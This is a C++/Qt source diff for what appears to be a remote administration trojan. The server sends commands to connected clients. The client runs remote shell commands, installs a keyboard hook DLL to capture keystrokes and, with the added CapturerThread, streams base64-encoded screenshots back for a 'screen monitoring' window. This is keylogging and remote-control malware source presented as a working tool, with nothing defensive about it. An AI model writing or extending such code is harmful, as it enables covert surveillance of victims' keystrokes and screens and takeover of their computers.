@@ -11,7 +11,9 @@ MainWindow::MainWindow(QWidget *parent)
 
     keyBoardMnt = NULL;
     cmdMnt = NULL;
+    capturerMnt = NULL;
     cmdThread = NULL;
+    capturerThread = NULL;
 }
 
 MainWindow::~MainWindow()
@@ -135,42 +137,56 @@ void MainWindow::on_exctCMD(char *data)
     netServer->send(index, common::packetType::cmd, data);
 }
 
-void MainWindow::on_client_send_data(int type, QString data)
+void MainWindow::on_client_send_data(int type, QByteArray data)
 {
-    QByteArray ba = data.toUtf8();
-    char *data2=ba.data();
-    netClient->send((common::packetType)type, data2);
-}
-
-void MainWindow::dispatchClientData(common::UPacket *packet)
-{
-    switch (packet->type) {
+    char* data2;
+    switch (type) {
     case common::packetType::cmd:
-        if(QString(packet->data) == "on")client_CMD(true);
-        else if(QString(packet->data) == "off")client_CMD(false);
-        else cmdThread->exctCMD(packet->data);
+        data2 = new char[data.length()];
+        memcpy(data2, data, data.length());
+        netClient->send((common::packetType)type, data2);
         break;
-    case common::packetType::keyHook:
-        if(QString(packet->data) == "on")client_KeyHook(true);
-        else if(QString(packet->data) == "off")client_KeyHook(false);
+    case common::packetType::capture:
+        data = data.toBase64();
+        data2 = new char[data.length()];
+        memcpy(data2, data, data.length());
+        netClient->send((common::packetType)type, data2);
         break;
     }
-    delete packet;
-    packet = NULL;
 }
 
-void MainWindow::dispatchServerData(common::UPacket *packet)
+void MainWindow::dispatchClientData(common::packetType type, char* data)
 {
-    switch (packet->type) {
+    switch (type) {
     case common::packetType::cmd:
-        cmdMnt->appentText(packet->data);
+        if(QString(data) == "on")client_CMD(true);
+        else if(QString(data) == "off")client_CMD(false);
+        else cmdThread->exctCMD(data);
         break;
     case common::packetType::keyHook:
-        keyBoardMnt->appentText(packet->data);
+        if(QString(data) == "on")client_KeyHook(true);
+        else if(QString(data) == "off")client_KeyHook(false);
+        break;
+    case common::packetType::capture:
+        if(QString(data) == "on")client_Capture(true);
+        else if(QString(data) == "off")client_Capture(false);
         break;
     }
-    delete packet;
-    packet = NULL;
+}
+
+void MainWindow::dispatchServerData(common::packetType type, char* data)
+{
+    switch (type) {
+    case common::packetType::cmd:
+        cmdMnt->appentText(data);
+        break;
+    case common::packetType::keyHook:
+        keyBoardMnt->appentText(data);
+        break;
+    case common::packetType::capture:
+        capturerMnt->refresh(data);
+        break;
+    }
 }
 
 void MainWindow::client_CMD(bool on_off)
@@ -193,11 +209,49 @@ void MainWindow::client_KeyHook(bool on_off)
         hookLib = new QLibrary(common::HOOKDLLPATH);
         hookLib->load();
         FUNC func = (FUNC)hookLib->resolve("SetHook");
-        func((HWND)this->winId());
+        if(func != NULL){
+            func((HWND)this->winId());
+        }
     }else{
         typedef bool (*FUNC)();
         FUNC func = (FUNC)hookLib->resolve("UnHook");
         func();
         hookLib->unload();
+    }
+}
+
+void MainWindow::client_Capture(bool on_off)
+{
+    if(on_off){
+        if(capturerThread == NULL){
+            capturerThread = new CapturerThread();
+            connect(capturerThread, &CapturerThread::client_send_data, this, &MainWindow::on_client_send_data);
+        }
+        else capturerThread->startThread();
+    }else{
+        capturerThread->closeThread();
+    }
+}
+
+void MainWindow::on_capturerButton_clicked()
+{
+    QList<QListWidgetItem*> itemList = ui->listWidget->selectedItems();
+    QListWidgetItem* item = nullptr;
+    if(itemList.length() == 1)item = (ui->listWidget->selectedItems())[0];
+    else {
+        ui->statusbar->showMessage("未选中或选中多个已连接Socket");
+        return;
+    }
+    int index = ui->listWidget->row(item);
+    if(ui->capturerButton->text() == "屏幕监控"){
+        char data[256] = "on";
+        netServer->send(index, common::packetType::capture, data);
+        if(capturerMnt == NULL)capturerMnt = new CapturerMnt();
+        capturerMnt->show();
+        ui->capturerButton->setText("关闭");
+    }else if(ui->capturerButton->text() == "关闭"){
+        char data[256] = "off";
+        netServer->send(index, common::packetType::capture, data);
+        ui->capturerButton->setText("屏幕监控");
     }
 }
